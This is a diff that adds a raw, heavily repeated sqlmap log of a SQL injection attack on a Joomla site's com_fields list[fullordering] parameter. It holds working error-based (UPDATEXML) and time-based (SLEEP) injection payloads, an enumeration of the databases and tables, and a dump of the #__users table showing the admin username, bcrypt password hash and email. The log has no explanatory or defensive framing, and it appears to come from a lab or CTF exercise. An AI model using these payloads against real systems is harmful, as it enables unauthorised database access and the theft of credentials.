@@ -1,0 +1,660 @@
+sqlmap identified the following injection point(s) with a total of 2548 HTTP(s) requests:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+available databases [5]:
+[*] information_schema
+[*] joomladb
+[*] mysql
+[*] performance_schema
+[*] sys
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+available databases [5]:
+[*] information_schema
+[*] joomladb
+[*] mysql
+[*] performance_schema
+[*] sys
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+available databases [5]:
+[*] information_schema
+[*] joomladb
+[*] mysql
+[*] performance_schema
+[*] sys
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(6836,CONCAT(0x2e,0x71716b7a71,(SELECT (ELT(6836=6836,1))),0x71786b7171),4666))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7207 FROM (SELECT(SLEEP(5)))xPKx)
+---
+back-end DBMS: MySQL >= 5.1
+Database: joomladb
+Table: #__users
+[1 entry]
++------+--------+--------------------------------------------------------------+----------+--------------------------+----------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+
+| id   | name   | password                                                     | username | email                    | usertype | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                       |
++------+--------+--------------------------------------------------------------+----------+--------------------------+----------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+
+| 629  | admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    | freddy@norealaddress.net |          | 0     | 1         | 2019-03-23 09:44:38 | 2019-03-25 12:59:30 | 0          | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} |
++------+--------+--------------------------------------------------------------+----------+--------------------------+----------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+
+
